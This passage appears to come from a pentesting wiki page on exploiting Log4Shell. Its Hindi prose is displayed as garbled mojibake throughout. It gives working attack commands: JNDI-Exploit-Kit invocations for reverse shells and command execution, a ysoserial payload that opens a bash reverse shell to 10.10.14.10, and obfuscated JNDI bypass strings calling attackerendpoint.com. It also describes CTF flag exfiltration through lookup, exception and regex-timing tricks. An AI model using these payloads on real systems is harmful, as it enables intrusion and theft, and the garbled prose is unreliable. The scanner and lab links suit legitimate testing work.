**рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рдЕрдиреНрдп рд╢реЛрд╖рдг рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЗ рд▓рд┐рдП `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдЖрдкрдХреЛ рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ, рдЖрдк LDAP рдФрд░ HTTP рд╕рд░реНрд╡рд░реЛрдВ рдХреЗ рдкреЛрд░реНрдЯ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

рдкрд┐рдЫрд▓реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреА рддрд░рд╣, рдЖрдк рдЗрд╕ рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрддрддрд╛ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдк рдкреАрдбрд╝рд┐рдд рдХреЛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП URL рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_рдЗрд╕ рдЕрдЯреИрдХ рдореЗрдВ рдПрдХ рдХрд╕реНрдЯрдо рдЬреЗрдирд░реЗрдЯреЗрдб рдЬрд╛рд╡рд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреЗрд╡рд▓ **THM рд╕реЛрд▓рд░ рд░реВрдо** рдЬреИрд╕реЗ рд▓реИрдм рдореЗрдВ рдХрд╛рдо рдХрд░реЗрдЧрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ (рдХреНрдпреЛрдВрдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЬрд╛рд╡рд╛ рдХреЛ рд░рд┐рдореЛрдЯ рдХреЛрдбрдмреЗрд╕ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП LDAP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ) рдореБрдЭреЗ рд▓рдЧрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХреНрд▓рд╛рд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдЕрдирд┐рдпрдорд┐рдд рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред_

### RCE - ysoserial рдФрд░ JNDI-Exploit-Kit

рдпрд╣ рд╡рд┐рдХрд▓реНрдк рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реИ **рдЬрд╛рд╡рд╛ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЛ рд╣рдореЗрд╢рд╛ рдХреЗрд╡рд▓ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХреНрд▓рд╛рд╕реЛрдВ рдкрд░ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХрд░рдиреЗ рдФрд░ рд╕рднреА рдХреЛ рдирд╣реАрдВ**ред рдЗрд╕рд▓рд┐рдП, **ysoserial** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдЬреЛ **рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХреНрд▓рд╛рд╕реЛрдВ рдХреЗ serialization** рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдХрд┐ рдЧреИрдЬреЗрдЯреНрд╕ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдЕрдирд┐рдпрдорд┐рдд рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** (_ysoserial рджреНрд╡рд╛рд░рд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХреНрд▓рд╛рд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд┐рдХреНрдЯрд┐рдо рдЬрд╛рд╡рд╛ рдкреНрд░реЛрдЧреНрд░рд╛рдо рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛рдо рдХрд░ рд╕рдХреЗ)_ред

**ysoserial** рдпрд╛ [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк JNDI рджреНрд╡рд╛рд░рд╛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
[**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ **JNDI рд▓рд┐рдВрдХ** рдЙрддреНрдкрдиреНрди рдХрд┐рдП рдЬрд╛ рд╕рдХреЗрдВ, рдЬрд╣рд╛рдВ рдЕрдкрд░рд┐рд╣рд╛рд░реНрдп рдорд╢реАрдиреЛрдВ рд╕реЗ рдХрдиреЗрдХреНрд╢рди рдХреА рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░ рд░рд╣рд╛ рд╣реЛред рдЖрдк **JNDI-Exploit-Kit рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдП рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рд╡рд┐рднрд┐рдиреНрди рдЕрдкрд░рд╛рдз** рдпрд╛ рдЕрдкрдиреЗ **рдЕрдкрд╢рдВрд╕рдиреАрдп рдкреЗрд▓реЛрдб** (рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рдпрд╛ ysoserial рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди) рдХреЛ рд╕рд░реНрд╡ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

рдЕрдм рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ рдПрдХ рдЙрддреНрдкрдиреНрди JNDI рд▓рд┐рдВрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрдХреНрд░рдорд┐рддрддрд╛ рдХреЛ рд╢реЛрдзрдиреЗ рдФрд░ рдПрдХ **рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: **`${ldap://10.10.14.10:1389/generated}`**

### рдмрд╛рдИрдкрд╛рд╕
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:─▒}}:ldap://...} //Notice the unicode "i"
```
### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд╕реНрдХреИрдирд░

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - рд╕реНрдерд╛рдиреАрдп рдЧрд▓рд┐рдпрд╛рд░реЛрдВ рдХреЛ рдЦреЛрдЬреЗрдВ

### рдкрд░реАрдХреНрд╖рдг рдХреЗ рд▓рд┐рдП рд▓реИрдм

* [**LogForge HTB рдорд╢реАрди**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar room**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## рдкреЛрд╕реНрдЯ-Log4Shell рдЙрддреНрдкреАрдбрд╝рди

рдЗрд╕ [**CTF writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) рдореЗрдВ рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ **Log4J** рдХреЗ рдХреБрдЫ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

Log4j рдХреЗ [**рд╕реБрд░рдХреНрд╖рд╛ рдкреГрд╖реНрда**](https://logging.apache.org/log4j/2.x/security.html) рдореЗрдВ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рд╡рд╛рдХреНрдп рд╣реИрдВ:

> рд╕рдВрд╕реНрдХрд░рдг 2.16.0 (рдЬрд╛рд╡рд╛ 8 рдХреЗ рд▓рд┐рдП) рд╕реЗ, **рд╕рдВрджреЗрд╢ рд▓реБрдХрдЕрдк рд╕реБрд╡рд┐рдзрд╛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╣рдЯрд╛ рджреА рдЧрдИ рд╣реИ**ред рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рд▓реБрдХрдЕрдк рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд▓реЙрдЧ4рдЬреЗ рдЕрдм рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ JNDI рддрдХ рдкрд╣реБрдВрдЪ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░ рджреЗрддрд╛ рд╣реИред рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ JNDI рд▓реБрдХрдЕрдк рдХреЛ рдЕрдм рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╕рдХреНрд╖рдо рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

> рд╕рдВрд╕реНрдХрд░рдг 2.17.0 (рдФрд░ рдЬрд╛рд╡рд╛ 7 рдФрд░ рдЬрд╛рд╡рд╛ 6 рдХреЗ рд▓рд┐рдП 2.12.3 рдФрд░ 2.3.1), **рдХреЗрд╡рд▓ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рд▓реБрдХрдЕрдк рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдХреЛ рд░рд┐рдХрд░реНрд╕рд┐рд╡ рд░реВрдк рд╕реЗ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**; рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧ рдореЗрдВ, рдХреЗрд╡рд▓ рд╢реАрд░реНрд╖-рд╕реНрддрд░ рдХрд╛ рд▓реБрдХрдЕрдк рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдХрд┐рд╕реА рднреА рдиреЗрд╕реНрдЯреЗрдб рд▓реБрдХрдЕрдк рдХреЛ рд╣рд▓ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЖрдк рдХрд┐рд╕реА рднреА `jndi` рдЕрднрд┐рдпрд╛рдВрддреНрд░рд┐рдХреА рдХрд╛ рдЙрдкрдпреЛрдЧ рднреВрд▓ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд░рд┐рдХрд░реНрд╕рд┐рд╡ рд▓реБрдХрдЕрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЙрдиреНрд╣реЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЙрд╕ CTF рдореЗрдВ рдпрд╣ рдлрд╝рд╛рдЗрд▓ log4j2.xml рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### рдПрдирд╡рд╛рдпрд░рдирдореЗрдВрдЯ рд▓реБрдХрдЕрдк

рдЗрд╕ CTF рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ рдиреЗ `${sys:cmd}` рдХреЗ рдорд╛рди рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдерд╛ рдФрд░ рдЙрд╕реЗ рдПрдирд╡рд╛рдпрд░рдирдореЗрдВрдЯ рд╡реЗрд░рд┐рдПрдмрд▓ рд╕реЗ рдлреНрд▓реИрдЧ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереАред\
рдЬреИрд╕рд╛ рдХрд┐ [**рдкрд┐рдЫрд▓реЗ рдкреЗрд▓реЛрдб**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification) рдореЗрдВ рджреЗрдЦрд╛ рдЧрдпрд╛ рд╣реИ, рдПрдирд╡рд╛рдпрд░рдирдореЗрдВрдЯ рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рд╣реИрдВ, рдЬреИрд╕реЗ: **`${env:FLAG}`**ред рдЗрд╕ CTF рдореЗрдВ рдпрд╣ рдЕрдиреБрдкрдпреЛрдЧреА рдерд╛, рд▓реЗрдХрд┐рди рдпрд╣ рдЕрдиреНрдп рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЬреАрд╡рди рдХреЗ рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### рдЕрдкрд╡рд╛рдж рдореЗрдВ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрд╢рди

CTF рдореЗрдВ, рдЖрдк рд▓реЙрдЧ4рдЬреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬрд╛рд╡рд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ stderr рддрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рдкрд╛ рд░рд╣реЗ рдереЗ, рд▓реЗрдХрд┐рди рд▓реЙрдЧ4рдЬреЗ **рдЕрдкрд╡рд╛рдж stdout рдкрд░ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ**, рдЬреЛ рдкрд╛рдпрдерди рдРрдк рдореЗрдВ рдкреНрд░рд┐рдВрдЯ рд╣реЛрддреЗ рд╣реИрдВред рдЗрд╕рдХрд╛ рдорддрд▓рдм рдерд╛ рдХрд┐ рдПрдХ рдЕрдкрд╡рд╛рдж рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдХреЗ рд╣рдо рд╕рд╛рдордЧреНрд░реА рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рдереЗред рдПрдХ рдЕрдкрд╡рд╛рдж рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдлреНрд▓реИрдЧ рдХреЛ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдерд╛: **`${java:${env:FLAG}}`.** рдпрд╣ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **`${java:CTF{blahblah}}`** рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ рдФрд░ рдПрдХ рдЕрдкрд╡рд╛рдж рдореЗрдВ рдлреНрд▓реИрдЧ рдХреЗ рдорд╛рди рдХреЛ рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛:

![](<../../.gitbook/assets/image (157).png>)

### рдкрд░рд┐рд╡рд░реНрддрди рдкреИрдЯрд░реНрди рдЕрдкрд╡рд╛рдж

рдмрд╕ рдЗрд╕реЗ рдЙрд▓реНрд▓реЗрдЦ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирдП [**рдкрд░рд┐рд╡рд░реНрддрди рдкреИрдЯрд░реНрди**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдкрд╡рд╛рдж рдХреЛ рд▓реЙрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ `stdout` рдкрд░ рд▓реЙрдЧ рд╣реЛрдЧрд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

рдпрд╣ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдХреЗ рдЕрдВрджрд░ рддрд┐рдерд┐ рдХреЛ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рдерд╛, рдХреНрдпреЛрдВрдХрд┐ рдкрд░рд┐рд╡рд░реНрддрди рдкреИрдЯрд░реНрди рд╕реЗ рдкрд╣рд▓реЗ рд▓реБрдХрдЕрдк рд╣рд▓ рдирд╣реАрдВ рд╣реБрдЖ рдерд╛, рд▓реЗрдХрд┐рди рдпрд╣ рдбрд┐рдЯреЗрдХреНрдЯ рдХрд░рдиреЗ рдЬреИрд╕реА рдЕрдиреНрдп рдЪреАрдЬреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### рдкрд░рд┐рд╡рд░реНрддрди рдкреИрдЯрд░реНрди рд░реЗрдЬреЗрдХреНрд╕

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХ рд▓реБрдХрдЕрдк рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ **рд░реЗрдЬреЗрдХреНрд╕ рд╕рдорд░реНрдерд┐рдд рдкрд░рд┐рд╡рд░реНрддрди рдкреИрдЯрд░реНрди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд╣рд╛рдВ рд░реЗрдЬреЗрдХреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдмрд╛рдЗрдирд░реА рдЦреЛрдЬ** рдпрд╛ **рд╕рдордп рдЖрдзрд╛рд░рд┐рдд** рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

* **рдЕрдкрд╡рд╛рдж рд╕рдВрджреЗрд╢ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдмрд╛рдЗрдирд░реА рдЦреЛрдЬ**

рдкрд░рд┐рд╡рд░реНрддрди рдкреИрдЯрд░реНрди **`%replace`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдПрдХ **рд╕реНрдЯреНрд░рд┐рдВрдЧ** рд╕реЗ **рд╕рд╛рдордЧреНрд░реА** рдХреЛ **рд░рд┐рдкреНрд▓реЗрд╕** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╣рд╛рдВ рддрдХ рдХрд┐ **рд░реЗрдЬреЗрдХреНрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред рдпрд╣ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ: `replace{pattern}{regex}{substitution}`\
рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рд░рд┐рдкреНрд▓реЗрд╕ рдХреЛ **рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдЧрд░ рд░реЗрдЬреЗрдХреНрд╕ рдХреБрдЫ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рдЕрдВрджрд░ рдорд┐рд▓ рдЧрдпрд╛** (рдФрд░ рдЕрдЧрд░ рдпрд╣ рдирд╣реАрдВ рдорд┐рд▓рд╛ рдерд╛ рддреЛ рдХреЛрдИ рдЕрдкрд╡рд╛рдж рдирд╣реАрдВ рд╣реЛрдЧрд╛) рдЗрд╕ рддрд░рд╣ рд╕реЗ:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **рдЯрд╛рдЗрдо рдЖрдзрд╛рд░рд┐рдд**

рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдореЗрдВ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдХрд┐ **`%replace`** рд░реЗрдЬреЗрдХреНрд╕ рдХреЛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, [**ReDoS рдкреЗрдЬ**](../regular-expression-denial-of-service-redos.md) рд╕реЗ рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ **рдЯрд╛рдЗрдордЖрдЙрдЯ** рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдпрджрд┐ рдлреНрд▓реИрдЧ рдорд┐рд▓ рдЬрд╛рддрд╛ рд╣реИред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рдкреЗрд▓реЛрдб рдЬреИрд╕реЗ `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` рдЙрд╕ CTF рдореЗрдВ рдПрдХ **рдЯрд╛рдЗрдордЖрдЙрдЯ** рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдЧрд╛ред

рдЗрд╕ [**writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) рдореЗрдВ, рдПрдХ ReDoS рд╣рдорд▓реЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛, рдмрд▓реНрдХрд┐ рдпрд╣ рдПрдХ **рд╡реГрджреНрдзрд┐ рд╣рдорд▓рд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╕рдордп рдЕрдВрддрд░ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> рдпрджрд┐ рдлреНрд▓реИрдЧ `flagGuess` рд╕реЗ рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдкреВрд░рд╛ рдлреНрд▓реИрдЧ 29 `#`-s рдХреЗ рд╕рд╛рде рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдореИрдВрдиреЗ рдЗрд╕ рд╡рд░реНрдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдЗрд╕рд▓рд┐рдП рдХрд┐рдпрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдлреНрд▓реИрдЧ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реЛрдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдХрдо рд╣реИ)ред **рдкреНрд░рддреНрдпреЗрдХ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк 29 `#`-s рдХреЛ рдлрд┐рд░ рд╕реЗ 54 `#`-s рд╕реЗ рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ **6 